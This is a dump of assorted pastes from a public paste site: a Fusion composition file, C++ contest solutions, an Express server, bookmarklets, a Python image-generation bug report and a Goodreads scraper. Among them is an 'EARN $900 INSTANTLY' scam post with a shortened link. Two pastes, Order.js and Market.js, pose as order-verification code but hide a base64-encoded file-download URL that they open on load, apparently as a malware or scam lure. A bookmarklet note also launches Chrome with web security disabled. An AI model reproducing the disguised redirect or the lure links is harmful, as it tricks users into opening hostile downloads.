					SourceOp = ""pEmitter3SizeOverLife"",
					Source = ""Value"",
				},
				[""ParticleStyle.BlurOverLife""] = Input {
					SourceOp = ""pEmitter3BlurOverLife2D"",
					Source = ""Value"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { 2750, 2359.5 } },
		},
		pEmitter3SizeOverLife = LUTBezier {
			KeyColorSplines = {
				[0] = {
					[0] = { 0.5, RH = { 0.3, 0.5 }, Flags = { Linear = true } },
					[1] = { 0.5, LH = { 0.7, 0.5 }, Flags = { Linear = true } }
				}
			},
			SplineColor = { Red = 192, Green = 128, Blue = 64 },
			CtrlWZoom = false,
		},
		pEmitter3BlurOverLife2D = LUTBezier {
			KeyColorSplines = {
				[0] = {
					[0] = { 0.5, RH = { 0.3, 0.5 }, Flags = { Linear = true } },
					[1] = { 0.5, LH = { 0.7, 0.5 }, Flags = { Linear = true } }
				}
			},
			SplineColor = { Red = 0, Green = 0, Blue = 0 },
			CtrlWZoom = false,
			NameSet = true,
		},
		AmbientLight1 = LightAmbient {
			Inputs = {
				[""Transform3DOp.Translate.X""] = Input { Value = 0.455294157967599, },
				[""Transform3DOp.Translate.Y""] = Input { Value = -0.291437834636187, },
				[""Transform3DOp.Translate.Z""] = Input { Value = -0.00391906766161974, },
				Intensity = Input { Value = 0.543, }
			},
			ViewInfo = OperatorInfo { Pos = { 3025, 2392.5 } },
		},
		Text3D1 = Text3D {
			Inputs = {
				LayoutRotation = Input { Value = 1, },
				SelectTransform = Input { Value = 2, },
				LineSpacing = Input { Value = 0.756, },
				CharacterSpacing = Input { Value = 1.2, },
				TransformRotation = Input { Value = 1, },
				StyledText = Input { Value = ""Just\n  Crop\nIt"", },
				Font = Input { Value = ""Open Sans"", },
				Style = Input { Value = ""Light"", },
				VerticalTopCenterBottom = Input { Value = 1, },
				VerticalJustification = Input { Value = 3, },
				VerticalJustificationNew = Input { Value = 3, },
				HorizontalJustificationNew = Input { Value = 3, },
				Extrusion = Input { Value = 1, },
				ExtrusionStyle = Input { Value = 1, },
				ExtrusionProfile = Input {
					SourceOp = ""Text3D1ExtrusionProfile"",
					Source = ""Value"",
				},
				ExtrusionDepth = Input { Value = 0.2, },
				BevelDepth = Input { Value = 0.1024, },
				BevelWidth = Input { Value = 0.078, },
				SmoothingAngle = Input { Value = 32.13, }
			},
			ViewInfo = OperatorInfo { Pos = { 2750, 2293.5 } },
		},
		Text3D1ExtrusionProfile = LUTBezier {
			KeyColorSplines = {
				[0] = {
					[0] = { 0, RH = { 0, 0.26445323888865 }, Flags = { Linear = true } },
					[0.114438502673797] = { 0.6, LH = { 0.0762961507548036, 0.526942507886193 }, RH = { 0.187167664731559, 0.739304733875964 } },
					[0.502399481745327] = { 1, LH = { 0.373079155388151, 1 }, RH = { 0.610512310468364, 1 } },
					[0.826737967914439] = { 0.740740740740741, LH = { 0.77763696960193, 0.837348575824786 }, RH = { 0.884486199566936, 0.627119188600965 } },
					[1] = { 0, LH = { 1, 0.323806549826305 } }
				}
			},
			SplineColor = { Red = 192, Green = 128, Blue = 64 },
			CtrlWZoom = false,
		},
		pRender3 = pRender {
			Inputs = {
				_MotionBlurWarning = Input { Disabled = true, },
				GlobalOut = Input { Value = 983, },
				Width = Input { Value = 1080, },
				Height = Input { Value = 1080, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				OutputMode = Input { Disabled = true, },
				[""MaterialID.MaterialID""] = Input { Value = 8, },
				[""ObjectID.ObjectID""] = Input { Value = 7, },
				Input = Input {
					SourceOp = ""pEmitter3"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { 2750, 2392.5 } },
		},
		Merge3D3 = Merge3D {
			Inputs = {
				[""Transform3DOp.Translate.Y""] = Input { Value = -0.296, },
				[""Transform3DOp.Rotate.Y""] = Input {
					Value = 88,
					Expression = ""time*2"",
				},
				SceneInput1 = Input {
					SourceOp = ""pRender3"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { 2750, 2425.5 } },
		},
		Merge3D2 = Merge3D {
			Inputs = {
				SceneInput1 = Input {
					SourceOp = ""Merge3D3"",
					Source = ""Output"",
				},
				SceneInput2 = Input {
					SourceOp = ""Camera3D2"",
					Source = ""Output"",
				},
				SceneInput3 = Input {
					SourceOp = ""SpotLight1"",
					Source = ""Output"",
				},
				SceneInput4 = Input {
					SourceOp = ""AmbientLight1"",
					Source = ""Output"",
				},
				SceneInput5 = Input {
					SourceOp = ""SpotLight1_1"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { 2860, 2458.5 } },
		},
		SpotLight1_1 = LightSpot {
			Inputs = {
				[""Transform3DOp.Translate.X""] = Input { Value = -0.238070836184698, },
				[""Transform3DOp.Translate.Y""] = Input { Value = 1.653, },
				[""Transform3DOp.Translate.Z""] = Input { Value = 7.58, },
				[""Transform3DOp.UseTarget""] = Input { Value = 1, },
				[""Transform3DOp.Target.X""] = Input { Value = -0.690234629217646, },
				Intensity = Input { Value = 0.15, },
				ConeAngle = Input { Value = 88.58, },
				PenumbraAngle = Input { Value = 2.36, },
				[""ShadowLightInputs3D.Nest""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowsEnabled""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowColorRed""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowColorGreen""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowColorBlue""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowMapSize""] = Input { Value = 2048, }
			},
			ViewInfo = OperatorInfo { Pos = { 3025, 2458.5 } },
		},
		SpotLight1 = LightSpot {
			Inputs = {
				[""Transform3DOp.Translate.X""] = Input { Value = 0.674142352588237, },
				[""Transform3DOp.Translate.Y""] = Input { Value = 3.37108805649589, },
				[""Transform3DOp.Translate.Z""] = Input { Value = 2.48776958228623, },
				[""Transform3DOp.UseTarget""] = Input { Value = 1, },
				[""Transform3DOp.Target.X""] = Input { Value = 0.753580522103758, },
				Intensity = Input { Value = 0.8, },
				ConeAngle = Input { Value = 53.15, },
				PenumbraAngle = Input { Value = 6.77, },
				Dropoff = Input { Value = 0, },
				[""ShadowLightInputs3D.Nest""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowsEnabled""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowColorRed""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowColorGreen""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowColorBlue""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowDensity""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowMapSize""] = Input { Value = 2048, },
				[""ShadowLightInputs3D.MultiplicativeBias""] = Input { Value = 30, },
				[""ShadowLightInputs3D.AdditiveBias""] = Input { Value = 30, }
			},
			ViewInfo = OperatorInfo { Pos = { 3025, 2425.5 } },
		},
		BrightnessContrast25 = BrightnessContrast {
			Inputs = {
				Alpha = Input { Value = 1, },
				Gain = Input { Value = 0.15, },
				Input = Input {
					SourceOp = ""FastNoise1_7"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { 2860, 2326.5 } },
		},
		FastNoise1_7 = FastNoise {
			Inputs = {
				GlobalOut = Input { Value = 983, },
				Width = Input { Value = 256, },
				Height = Input { Value = 256, },
				Depth = Input { Value = 4, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				XScale = Input { Value = 10, },
				SeetheRate = Input { Value = 0.669, },
				Type = Input { Value = 1, },
				GradientType = Input { Value = 5, },
				Start = Input { Value = { 0.5, 0.5 }, },
				Gradient = Input {
					Value = Gradient {
						Colors = {
							[0] = { 1, 1, 1, 1 },
							[0.667] = { 0, 0, 0, 0 }
						}
					},
				}
			},
			ViewInfo = OperatorInfo { Pos = { 2860, 2293.5 } },
		},
		Renderer3D2 = Renderer3D {
			CustomData = {
				ToolVersion = 2,
			},
			Inputs = {
				GlobalOut = Input { Value = 983, },
				Width = Input { Value = 1080, },
				Height = Input { Value = 1080, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				SceneInput = Input {
					SourceOp = ""Merge3D2"",
					Source = ""Output"",
				},
				[""RendererSoftware.Channels.Nest""] = Input { Value = 1, },
				[""RendererSoftware.LightingEnabled""] = Input { Value = 1, },
				[""RendererSoftware.ShadowsEnabled""] = Input { Value = 1, },
				[""RendererOpenGL.Channels.Nest""] = Input { Value = 1, },
				[""RendererOpenGL.AntiAliasing.Channels.RGBA.HighQuality.Enable""] = Input { Value = 1, },
				[""RendererOpenGL.AntiAliasing.Presets.Color.Supersampling.HighQuality.Rate""] = Input { Value = 3, },
				[""RendererOpenGL.AntiAliasing.Presets.Color.Multisampling.LowQuality.SampleCount""] = Input { Value = 2, },
				[""RendererOpenGL.AntiAliasing.Presets.Color.Multisampling.HighQuality.SampleCount""] = Input { Value = 3, },
				[""RendererOpenGL.AntiAliasing.Presets.Aux.Supersampling.HighQuality.Rate""] = Input { Value = 3, },
				[""RendererOpenGL.AntiAliasing.Presets.Aux.Multisampling.LowQuality.SampleCount""] = Input { Value = 2, },
				[""RendererOpenGL.AntiAliasing.Presets.Aux.Multisampling.HighQuality.SampleCount""] = Input { Value = 3, },
				[""RendererOpenGL.AccumQuality""] = Input { Value = 32, },
				[""RendererOpenGL.LightingEnabled""] = Input { Value = 1, },
				[""RendererOpenGL.ShadowsEnabled""] = Input { Value = 1, },
				[""RendererOpenGL.MaximumTextureDepth""] = Input { Value = 3, },
				[""RendererOpenGL.TransparencySorting""] = Input { Value = 1, }
			},
			ViewInfo = OperatorInfo { Pos = { 2860, 2491.5 } },
			SubInputsData = {
				RendererOpenGL = {
					Version = 1
				}
			}
		},
		BrightnessContrast24 = BrightnessContrast {
			Inputs = {
				Gamma = Input { Value = 0.45, },
				Input = Input {
					SourceOp = ""Background1_5"",
					Source = ""Output"",
				},
				EffectMask = Input {
					SourceOp = ""Ellipse6"",
					Source = ""Mask"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { 2970, 2590.5 } },
		},
		Ellipse6 = EllipseMask {
			Inputs = {
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				SoftEdge = Input { Value = 0.6, },
				Invert = Input { Value = 1, },
				MaskWidth = Input { Value = 1080, },
				MaskHeight = Input { Value = 1080, },
				PixelAspect = Input { Value = { 1, 1 }, },
				ClippingMode = Input { Value = FuID { ""None"" }, },
				Center = Input { Value = { 0.307807807807808, 0.0843373493975904 }, },
				Width = Input { Value = 1.56965160099012, },
				Height = Input { Value = 1.56965160099012, }
			},
			ViewInfo = OperatorInfo { Pos = { 2970, 2557.5 } },
		},
		CameraShake1 = CameraShake {
			Inputs = {
				Randomness = Input { Value = 0.882, },
				OverallStrength = Input {
					SourceOp = ""CameraShake1OverallStrength"",
					Source = ""Value"",
				},
				Speed = Input { Value = 0.087, },
				FrequencyMethod = Input { Value = 1, },
				Input = Input {
					SourceOp = ""Renderer3D2"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { 2860, 2557.5 } },
		},
		CameraShake1OverallStrength = BezierSpline {
			SplineColor = { Red = 207, Green = 239, Blue = 163 },
			CtrlWZoom = false,
			NameSet = true,
			KeyFrames = {
				[0] = { 0, RH = { 6.66666666666667, 0.0166666666666667 }, Flags = { Linear = true } },
				[20] = { 0.05, LH = { 13.3333333333333, 0.0333333333333333 }, RH = { 70, 0.05 }, Flags = { Linear = true } },
				[170] = { 0.05, LH = { 120, 0.05 }, RH = { 173.333333333333, 0.0333333333333333 }, Flags = { Linear = true } },
				[180] = { 0, LH = { 176.666666666667, 0.0166666666666667 }, Flags = { Linear = true } }
			}
		},
		Background1_5 = Background {
			NameSet = true,
			Inputs = {
				GlobalOut = Input { Value = 983, },
				Width = Input { Value = 1080, },
				Height = Input { Value = 1080, },
				Depth = Input { Value = 1, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				TopLeftRed = Input { Value = 0.62211, },
				TopLeftGreen = Input { Value = 0.76784216, },
				TopLeftBlue = Input { Value = 0.89, }
			},
			ViewInfo = OperatorInfo { Pos = { 3080, 2590.5 } },
		},
		Merge42 = Merge {
			CtrlWZoom = false,
			Inputs = {
				Background = Input {
					SourceOp = ""BrightnessContrast24"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""CameraShake1"",
					Source = ""Output"",
				},
				PerformDepthMerge = Input { Value = 0, }
			},
			ViewInfo = OperatorInfo { Pos = { 2860, 2623.5 } },
		}
	}
}"
vji8TV9y,⭐EARN $900 INSTANTLY 2025 MI,B4AT,JavaScript,Tuesday 8th of April 2025 12:11:22 PM CDT," 
Pdf https://surl.li/lgybtn


Ye4URLBhCb
"
QVMbwdNN,小球反弹 参考代码,Dmaxiya,C++,Tuesday 8th of April 2025 12:01:47 PM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif  // ExRoc
    ios::sync_with_stdio(false);

    LL x = 15 * 233333 * 2;
    LL y = 17 * 343720 * 2;
    LL g = __gcd(x, y);
    LL lcm = x / g * y;
    LL a = lcm / x;
    LL b = lcm / y;
    double ans = sqrt(233333 * a * 2 * 233333 * a * 2 + 343720 * b * 2 * 343720 * b * 2);
    printf(""%.2f\n"", ans);

    return 0;
}
"
veuWjN0L,Handlebars app 2,MCreeper12731,JavaScript,Tuesday 8th of April 2025 11:51:16 AM CDT,"import express from 'express';
import { dirname, join } from ""path"";
import { fileURLToPath } from ""url"";

const __dirname = dirname(fileURLToPath(import.meta.url));

const app = express();

app.set('view engine', 'hbs');
app.set('views', join(__dirname, 'views'));
app.use(express.static(join(__dirname, ""public"")));
app.use(express.urlencoded({ extended: true }));
    
app.get(""/"", (req, res) => {
    res.render(""index"", { title: ""Main Page"" })
});

app.get(""/breeds"", (req, res) => {
    res.render(""breeds"", { title: ""Cat Breeds"" })
});

app.get(""/adoption"", (req, res) => {
    res.render(""adoption"", { title: ""Adoption"" })
});



app.listen(3000, () => {
    console.log('Server is running at http://localhost:3000');
});"
LLeuZqXU,奇怪的数 参考代码,Dmaxiya,C++,Tuesday 8th of April 2025 11:20:33 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const LL MOD = 998244353;
const int maxn = 10;
int n, m;
LL ans;
LL dp[2][maxn][maxn][maxn][maxn];

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif  // ExRoc
    ios::sync_with_stdio(false);

    cin >> n >> m;
    for (int a = 1; a < 10; a += 2) {
        for (int b = 0; b < 10; b += 2) {
            for (int c = 1; c < 10; c += 2) {
                for (int d = 0; d < 10; d += 2) {
                    if (a + b + c + d <= m) {
                        dp[0][a][b][c][d] = 1;
                    }
                }
            }
        }
    }

    for (int i = 5; i <= n; ++i) {
        int nowi = (i % 2);
        int prei = nowi ^ 1;
        memset(dp[nowi], 0, sizeof(dp[nowi]));
        for (int e = nowi; e < 10; e += 2) {
            for (int d = nowi ^ 1; d < 10; d += 2) {
                for (int c = nowi; c < 10; c += 2) {
                    for (int b = nowi ^ 1; b < 10; b += 2) {
                        for (int a = nowi; a < 10; a += 2) {
                            if (a + b + c + d + e > m) {
                                continue;
                            }
                            dp[nowi][b][c][d][e] =
                                (dp[nowi][b][c][d][e] + dp[prei][a][b][c][d]) %
                                MOD;
                        }
                    }
                }
            }
        }
    }

    for (int a = 0; a < 10; ++a) {
        for (int b = 0; b < 10; ++b) {
            for (int c = 0; c < 10; ++c) {
                for (int d = 0; d < 10; ++d) {
                    ans = (ans + dp[n & 1][a][b][c][d]) % MOD;
                }
            }
        }
    }
    cout << ans << endl;

    return 0;
}
"
f3K4RNVB,Dancing Popup Javascripts,CCGameing,JavaScript,Tuesday 8th of April 2025 11:16:28 AM CDT,"/*  Fun Javascripts for your browser!
 *  Add these to your bookmarks ( RClick on Bookmark Bar > Add Page ) to run any time!
 */

// Name: Page Popup
javascript: var popup = window.open(location.href, '', ""width=300,height=300""); popup.moveTo(screen.availLeft + screen.availWidth/2 - 150, screen.availTop + screen.availHeight/2 - 150);

// Name: Popup Dance
// Note! This has to be pasted into the console of the popup ( CTRL + Shift + I > CTRL + V )
javascript: time = Math.PI/2; timeSin = 0; timeCos = 0; function dance() { time += 60/1000; timeSin = Math.sin(time) * 10; timeCos = Math.cos(time * 2) * 10; moveBy(timeSin, timeCos); requestAnimationFrame(dance)}; dance();

// Name: Popup Dance (Advanced)
// Note: This has to be run in a browser instance. File for this given below
// Note: Really just a combination of the two above but made easier to setup using injection
javascript: var popup = window.open(location.href, '', ""width=300,height=300""); popup.moveTo(screen.availLeft + screen.availWidth/2 - 150, screen.availTop + screen.availHeight/2 - 150); function inject() { var time = Math.PI/2; var timeSin = 0;var timeCos = 0;function dance() { time += 60/1000; timeSin = Math.sin(time) * 10; timeCos = Math.cos(time * 2) * 10; moveBy(timeSin, timeCos);requestAnimationFrame(dance); }; dance(); console.log(""Script Injected!""); }; var script = popup.document.createElement('script');script.innerHTML = '(' + inject.toString() + '());';popup.onload = function() { this.document.head.appendChild(script) }

// Name: Chrome Dev Mode.cmd
// Note: This is a command prompt to create a chrome instance where the above javascript works
start """" ""C:\Program Files\Google\Chrome\Application\chrome.exe"" --user-data-dir=""C:/Users/[username]/Documents/Projects/Testing/Chrome dev session"" --disable-web-security"
7ULcgM89,Untitled,Tranquility3,Python,Tuesday 8th of April 2025 11:12:55 AM CDT,"def generate_star_field(width, height, num_stars=1000):
    img = Image.new('RGB', (width, height), 'black')
    draw = ImageDraw.Draw(img)
    for _ in range(num_stars):
        x = random.randint(0, width)
        y = random.randint(0, height)
        brightness = random.randint(180, 255)
        size = random.choice([1, 2])
        draw.ellipse((x, y, x + size, y + size), fill=(brightness,) * 3)
    return img

def generate_fractal_noise(width, height, octaves=5, persistence=0.5):
    noise = np.zeros((height, width), dtype=np.float32)
    amp = 1
    total_amp = 0
    for _ in range(octaves):
        layer = np.random.rand(height, width)
        noise += layer * amp
        total_amp += amp
        amp *= persistence
    noise /= total_amp
    noise = (noise - noise.min()) / (noise.max() - noise.min())
    return noise

def generate_nebula_blob(width, height, color, alpha=0.9, blur=8):
    noise = generate_fractal_noise(width, height, octaves=6, persistence=0.5)
    x, y = np.meshgrid(np.linspace(-1, 1, width), np.linspace(-1, 1, height))
    d = np.sqrt(x * x + y * y)
    radial_falloff = np.exp(-d**2 * 3)
    combined = noise * radial_falloff
    combined = (combined - combined.min()) / (combined.max() - combined.min())
    mask_array = (combined * 255).astype(np.uint8)
    mask = Image.fromarray(mask_array).filter(ImageFilter.GaussianBlur(radius=blur))
    blob = Image.new(""RGBA"", (width, height), color + (0,))
    blob.putalpha(mask.point(lambda p: int(p * alpha)))
    return blob

def place_blob(base, blob, position, angle=0):
    rotated = blob.rotate(angle, expand=True)
    temp = Image.new(""RGBA"", base.size)
    px, py = position[0] - rotated.size[0] // 2, position[1] - rotated.size[1] // 2
    temp.paste(rotated, (px, py), rotated)
    return Image.alpha_composite(base, temp)

def generate_nebula_image(width, height):
    base = generate_star_field(width, height).convert(""RGBA"")
    colors = [
        (255, 100, 100),
        (100, 200, 255),
        (180, 100, 255),
        (255, 255, 120),
        (100, 255, 180),
    ]
    for _ in range(10):
        scale = random.uniform(0.8, 1.4)
        blob_size = int(width * scale), int(height * scale)
        color = random.choice(colors)
        blob = generate_nebula_blob(*blob_size, color, alpha=0.95)
        pos = (random.randint(0, width), random.randint(0, height))
        angle = random.randint(0, 360)
        base = place_blob(base, blob, pos, angle)

    base = ImageEnhance.Contrast(base).enhance(1.3)
    base = ImageEnhance.Brightness(base).enhance(1.2)
    # 🟢 FIX: return a proper RGB image
    rgb_image = base.convert(""RGB"")
    return rgb_image


async def create_system(self, system_id):
    system = self.bot.systems[system_id]
    # Get the editor object instead of a plain image
    c_width = 1920
    c_height = 1080
    img = generate_nebula_image(1920, 1080)
    print(type(img), img.mode)
    bg = await asyncio.to_thread(generate_nebula_image(c_width, c_height))
    
    editor = Editor(bg)

    # Example: Add a title
    font = Font.poppins(size=48, variant=""bold"")
    editor.text((c_width/2, 50), system.name, font=font, color=""white"", align = ""center"")

    # Example: Draw a glowing dot or overlay (custom UI)
    editor.ellipse((900, 600), width=20, height=20, color=Color(""cyan""))
    
    # Save to buffer
    buffer = BytesIO()
    await asyncio.to_thread(editor.image.save, buffer, format=""PNG"")
    buffer.seek(0)
    return buffer




Traceback error:
    Ignoring exception in command starfield:
Traceback (most recent call last):
  File ""/home/tranquility/Bots/Orion/lib/python3.9/site-packages/nextcord/application_command.py"", line 1053, in _call_with_hooks
    await callback(*args)
  File ""/home/tranquility/Bots/Orion/lib/python3.9/site-packages/nextcord/application_command.py"", line 1135, in call_invoke_slash
    await self.invoke_slash(interaction, **kwargs)
  File ""/home/tranquility/Bots/Orion/lib/python3.9/site-packages/nextcord/application_command.py"", line 1226, in invoke_slash
    await self.callback(self._self_argument, interaction, **kwargs)
  File ""/home/tranquility/Bots/Orion/cogs/misc.py"", line 146, in starfield
    buffer = await create_system(self, 0)
  File ""/home/tranquility/Bots/Orion/utils/solar_system.py"", line 92, in create_system
    bg = await asyncio.to_thread(generate_nebula_image(c_width, c_height))
  File ""/usr/lib/python3.9/asyncio/threads.py"", line 25, in to_thread
    return await loop.run_in_executor(None, func_call)
  File ""/usr/lib/python3.9/concurrent/futures/thread.py"", line 58, in run
    result = self.fn(*self.args, **self.kwargs)
TypeError: 'Image' object is not callable

The above exception was the direct cause of the following exception:

nextcord.errors.ApplicationInvokeError: Command raised an exception: TypeError: 'Image' object is not callable
"
6pNeJ7Sj,Order.js,SpawnKz,JavaScript,Tuesday 8th of April 2025 11:06:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/66466/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5XR7jL2q,Market.js,SpawnKz,JavaScript,Tuesday 8th of April 2025 10:51:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56661/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4d5E2FXP,gr scrape good 2 only 200(sometimes 300),STANAANDREY,Python,Tuesday 8th of April 2025 10:42:18 AM CDT,"import requests
from bs4 import BeautifulSoup
import pandas as pd
import re
import time
import random

def scrape_goodreads_best_books(num_pages=3):
    all_books = []
    base_url = ""https://www.goodreads.com/list/show/1.Best_Books_Ever""
    
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
    ]
    
    for page in range(1, num_pages + 1):
        if page == 1:
            url = base_url
        else:
            url = f""{base_url}?page={page}""
        
        print(f""Scraping page {page}: {url}"")
        
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        }
        
        if page > 1:
            delay = random.uniform(2, 5)
            print(f""Waiting {delay:.2f} seconds before next request..."")
            time.sleep(delay)
        
        try:
            response = requests.get(url, headers=headers, timeout=30)
            print(f""Response status code: {response.status_code}"")
            
            if response.status_code != 200:
                print(f""Failed to retrieve page {page}. Stopping."")
                break
                
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Check if we're being blocked
            title = soup.title.text if soup.title else ""No title found""
            if ""robot"" in title.lower() or ""captcha"" in title.lower() or ""blocked"" in title.lower():
                print(f""Detected anti-bot measures on page {page}. Stopping."")
                break
            
            # Find all book entries on the page
            book_elements = soup.select(""table.tableList tr"")
            print(f""Found {len(book_elements)} books on page {page}"")
            
            # Calculate base ranking for this page
            base_rank = (page - 1) * 100
            
            # Extract data for each book
            for i, book in enumerate(book_elements):
                try:
                    # Calculate ranking
                    rank = base_rank + i + 1
                    
                    # Extract title and URL
                    title_el = book.select_one("".bookTitle"")
                    title = title_el.text.strip() if title_el else ""Unknown Title""
                    
                    # Extract book URL for description fetching (won't be stored in DataFrame)
                    book_url = None
                    if title_el and title_el.get('href'):
                        book_url = f""https://www.goodreads.com{title_el.get('href')}""
                    
                    # Extract author
                    author_el = book.select_one("".authorName"")
                    author = author_el.text.strip() if author_el else ""Unknown Author""
                    
                    # Extract rating
                    rating_el = book.select_one("".minirating"")
                    rating_text = rating_el.text.strip() if rating_el else """"
                    rating_match = re.search(r'(\d+\.\d+)', rating_text)
                    avg_rating = float(rating_match.group(1)) if rating_match else None
                    
                    # Extract score - FIXED APPROACH
                    score = 0
                    
                    # Look for the score text (not people voted)
                    vote_elements = book.select("".uitext"")
                    for el in vote_elements:
                        text = el.text.strip()
                        # Look for ""score: X"" pattern
                        if ""score:"" in text.lower():
                            score_match = re.search(r'score:\s*([\d,]+)', text, re.IGNORECASE)
                            if score_match:
                                score = int(score_match.group(1).replace(',', ''))
                                break
                    
                    # If first book on first page, print debug info
                    if rank == 1:
                        print(""\nDEBUG INFO FOR FIRST BOOK:"")
                        print(f""Title: {title}"")
                        print(f""All text in book element: {book.text.strip()[:500]}"")
                        print(f""Vote elements found: {len(vote_elements)}"")
                        for idx, el in enumerate(vote_elements):
                            print(f""Vote element {idx}: {el.text.strip()}"")
                    
                    # Create book entry
                    book_data = {
                        ""rank"": rank,
                        ""title"": title,
                        ""author"": author,
                        ""avg_rating"": avg_rating,
                        ""score"": score,
                        ""temp_url"": book_url,  # Temporary field, will be removed later
                        ""description"": None  # Will be populated later
                    }
                    
                    all_books.append(book_data)
                    
                except Exception as e:
                    print(f""Error extracting book {i+1} on page {page}: {e}"")
            
        except Exception as e:
            print(f""Error processing page {page}: {e}"")
    
    print(f""Total books collected: {len(all_books)}"")
    return all_books

def get_book_description(book_url):
    """"""Fetch the book description from its detail page""""""
    if not book_url:
        return ""No description available""
    
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
        }
        
        response = requests.get(book_url, headers=headers, timeout=30)
        
        if response.status_code != 200:
            return ""Failed to retrieve description""
            
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Try different selectors for description
        description_el = (
            soup.select_one(""#description span[style='display:none']"") or
            soup.select_one(""#description span"") or
            soup.select_one("".DetailsLayoutRightParagraph__widthConstrained"") or
            soup.select_one(""[data-testid='description']"") or
            soup.select_one(""#description"")
        )
        
        if description_el:
            return description_el.text.strip()
        else:
            book_desc_section = soup.find('div', id='descriptionContainer')
            if book_desc_section:
                return book_desc_section.text.strip()
            return ""No description found on page""
            
    except Exception as e:
        return f""Error fetching description: {e}""

# Main execution
print(""Starting Goodreads Best Books scraper..."")
books = scrape_goodreads_best_books(num_pages=3)  # Scrape 3 pages

# Create DataFrame
df = pd.DataFrame(books)

# Sort by rank to ensure proper order
df = df.sort_values('rank')

# Fetch descriptions for all books
print(""\nFetching descriptions for all books..."")
for i, book in enumerate(df.to_dict('records')):
    try:
        print(f""Fetching description for #{book['rank']}: {book['title']}"")
        description = get_book_description(book['temp_url'])
        truncated_description = description[:100] + ""..."" if len(description) > 100 else description
        df.loc[df['rank'] == book['rank'], 'description'] = truncated_description
        time.sleep(random.uniform(0.5, 1.5))  # Add delay between requests
    except Exception as e:
        print(f""Error fetching description for book #{book['rank']}: {e}"")

# Remove the temporary URL column
